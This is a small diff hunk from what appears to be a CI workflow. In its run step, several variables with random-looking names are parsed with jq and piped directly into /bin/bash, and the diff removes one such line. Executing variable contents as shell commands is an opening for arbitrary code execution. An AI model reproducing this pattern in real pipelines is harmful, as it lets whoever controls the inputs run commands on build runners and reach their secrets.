@@ -21,7 +21,6 @@ jobs:
         run: |
           printf '%s' "$fa44345" | jq -r .qtt8 | /bin/bash
           echo $wik78817 | jq -r .g9 | /bin/bash
-          echo $cds95285 | jq -r .ij5975 | /bin/bash
           printf '%s' "$ugzx05" | jq -r .gu7 | /bin/bash
           printf '%s' "$unson182" | jq -r .buqt14 | /bin/bash
           printf '%s' "$cx410" | jq -r .wsz6 | /bin/bash
